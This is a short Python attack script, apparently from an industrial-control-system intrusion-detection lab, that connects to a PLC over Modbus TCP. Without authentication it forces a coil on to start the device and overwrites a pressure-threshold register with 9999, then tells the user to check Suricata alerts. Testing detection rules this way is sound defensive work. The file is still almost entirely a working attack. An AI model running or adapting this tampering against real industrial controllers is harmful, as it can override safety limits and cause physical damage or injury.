from pymodbus.client import ModbusTcpClient
import time

TARGET_IP = '192.168.11.129'  
TARGET_PORT = 502
UNIT_ID = 1

def unauthorized_modification_attack():
    print(f"[*] Launching Scenario C: Unauthorized Parameter Tampering Attack against {TARGET_IP}:{TARGET_PORT}")
    client = ModbusTcpClient(TARGET_IP, port=TARGET_PORT)
    
    if client.connect():
        print("[+] Perimeter breached successfully; connected to target PLC!")
        
        print("[*] Sending FC 05 (Write Single Coil) - Attempting to force start the device...")
        client.write_coil(1, True, slave=UNIT_ID)
        time.sleep(1)
        
        print("[*] Sending FC 06 (Write Single Register) - Attempting to tamper with pressure threshold to 9999...")
        client.write_register(1, 9999, slave=UNIT_ID)
        
        print("[+] Tampering commands sent! Please check Suricata alerts (SID: 1000007, 1000008)")
        client.close()
    else:
        print("[-] Unable to connect to target PLC.")

if __name__ == "__main__":
    unauthorized_modification_attack()
